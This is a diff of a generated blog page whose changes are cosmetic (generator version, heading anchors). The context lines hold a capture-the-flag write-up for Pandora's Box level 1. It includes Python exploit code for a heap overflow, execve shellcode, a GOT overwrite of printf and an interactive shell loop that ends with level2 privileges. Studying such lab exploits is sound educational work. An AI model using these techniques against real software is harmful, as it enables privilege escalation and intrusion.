@@ -5,7 +5,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.15" />
+<meta name="generator" content="Hugo 0.18.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://rastamouse.me/css/style.css" type="text/css">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
@@ -52,9 +52,9 @@
   </div>
   <h1 class="headline" itemprop="headline">Pandora&#39;s Box: 1 - Level 1</h1>
   <section class="body" itemprop="articleBody">
-    
+    <p>After completing <a href="/blog/2015/pandoras-box-1-level-0/">Level 0</a>, I echo&rsquo;d my public key into <code>authorized_keys</code> to allow for easy access.  So the first thing to do is check out level1&rsquo;s home directory.</p>
 
-<p>After completing <a href="/blog/2015/pandoras-box-1-level-0/">Level 0</a>, I echo&rsquo;d my public key into <code>authorized_keys</code> to allow for easy access.  So the first thing to do is check out level1&rsquo;s home directory.</p>
+<p></p>
 
 <pre><code class="language-text">level1@pb0x:~$ ls -l
 
@@ -94,7 +94,7 @@ Command list:
 
 <p>So fairly obviously, this is an application which is capable of creating, recalling and removing notes.</p>
 
-<h2 id="some-analysis:0c6c06b27ea44a33d384e9d33383a423">Some Analysis</h2>
+<h2 id="some-analysis">Some Analysis</h2>
 
 <p>I uploaded peda and started to analyse the binary.</p>
 
@@ -177,7 +177,7 @@ Breakpoint 1, 0x0804887d in create_struct ()
 0x087fe000 0x087ff000 rwxp     [heap]
 </code></pre>
 
-<h2 id="some-fuzzing:0c6c06b27ea44a33d384e9d33383a423">Some Fuzzing</h2>
+<h2 id="some-fuzzing">Some Fuzzing</h2>
 
 <p>Whilst fuzzing around locally in GDB, I found that I could force a crash.</p>
 
@@ -235,11 +235,11 @@ Stopped reason: SIGSEGV
 
 <p>But knowing the pointer for a note, I would be able to calculate the location of every other note on the heap, as they are a set &lsquo;distance&rsquo; from each other.  It means I can store shellcode in a note&rsquo;s text portion (executable thanks to <code>mprotect</code>) and jump there with a GOT overwrite&hellip;</p>
 
-<h2 id="exploit:0c6c06b27ea44a33d384e9d33383a423">Exploit</h2>
+<h2 id="exploit">Exploit</h2>
 
 <p>There are a few steps to this exploit, so I wanted to step through it bit-by-bit.</p>
 
-<h3 id="handling-comms:0c6c06b27ea44a33d384e9d33383a423">Handling comms</h3>
+<h3 id="handling-comms">Handling comms</h3>
 
 <p>First, I wanted to set up a function for sending and receiving data, because it&rsquo;s a complete PITA to keep having to do <code>s.recv</code> all the time.</p>
 
@@ -264,7 +264,7 @@ Stopped reason: SIGSEGV
 
 <p>i.e. send nothing and receive data until the <code>&gt;</code> prompt is presented.</p>
 
-<h3 id="creating-notes:0c6c06b27ea44a33d384e9d33383a423">Creating notes</h3>
+<h3 id="creating-notes">Creating notes</h3>
 
 <p>I&rsquo;m going to use 3 notes to carry out this exploit, I tried to do it in 2 but it didn&rsquo;t seem to work.</p>
 
@@ -273,7 +273,7 @@ comm('new', '&gt;')
 comm('new', '&gt;')
 </code></pre>
 
-<h3 id="set-note-0:0c6c06b27ea44a33d384e9d33383a423">Set note 0</h3>
+<h3 id="set-note-0">Set note 0</h3>
 
 <pre><code class="language-python">comm('set', 'id')
 comm('0', 'text')
@@ -282,7 +282,7 @@ comm(buffer, '&gt;')
 
 <p>where <code>buffer = 'A' * 76</code></p>
 
-<h3 id="leak-the-pointer-of-note-1:0c6c06b27ea44a33d384e9d33383a423">Leak the pointer of note 1</h3>
+<h3 id="leak-the-pointer-of-note-1">Leak the pointer of note 1</h3>
 
 <pre><code class="language-python">comm('show', 'id')
 s.send('0\n')
@@ -303,7 +303,7 @@ address = struct.unpack('I', data[93:97])[0]
 
 <p>If we print this in hex, it will come out something like <code>print hex(address)</code> &gt;&gt; <code>0x9e69070</code></p>
 
-<h3 id="write-shellcode-into-note-2:0c6c06b27ea44a33d384e9d33383a423">Write shellcode into note 2</h3>
+<h3 id="write-shellcode-into-note-2">Write shellcode into note 2</h3>
 
 <pre><code class="language-python">comm('set', 'id')
 comm('2', 'text')
@@ -317,7 +317,7 @@ comm(shellcode, '&gt;')
 
 <p>This is <code>execve</code> shellcode from <a href="http://shell-storm.org/shellcode/files/shellcode-575.php">Shellstorm</a>.</p>
 
-<h3 id="write-printf-into-note-1-pointer:0c6c06b27ea44a33d384e9d33383a423">Write printf into note 1 pointer</h3>
+<h3 id="write-printf-into-note-1-pointer">Write printf into note 1 pointer</h3>
 
 <pre><code class="language-python">comm('set', 'id')
 comm('0', 'text')
@@ -326,7 +326,7 @@ comm(buffer + printf, '&gt;')
 
 <p>where <code>printf = '\x70\xa3\x04\x08'</code> from <code>level1@pb0x:~$ objdump -R level2</code>.</p>
 
-<h3 id="trigger-the-overwrite:0c6c06b27ea44a33d384e9d33383a423">Trigger the overwrite</h3>
+<h3 id="trigger-the-overwrite">Trigger the overwrite</h3>
 
 <pre><code class="language-python">comm('set', 'id')
 comm('1', 'text')
@@ -349,7 +349,7 @@ s.send(payload + '\n')
 <li>Length field = 4 bytes</li>
 </ul>
 
-<h3 id="handle-the-shell-commands:0c6c06b27ea44a33d384e9d33383a423">Handle the shell commands</h3>
+<h3 id="handle-the-shell-commands">Handle the shell commands</h3>
 
 <pre><code class="language-python">while True:
         cmd = raw_input('# ')
@@ -357,7 +357,7 @@ s.send(payload + '\n')
         sys.stdout.write(s.recv(10240))
 </code></pre>
 
-<h2 id="putting-it-together:0c6c06b27ea44a33d384e9d33383a423">Putting it together!</h2>
+<h2 id="putting-it-together">Putting it together!</h2>
 
 <pre><code class="language-python">#!/usr/bin/env python
 
@@ -436,7 +436,6 @@ uid=1001(level1) gid=1001(level1) euid=1002(level2) groups=1002(level2),1001(lev
 # whoami
 level2
 </code></pre>
-
   </section>
 </article>
 
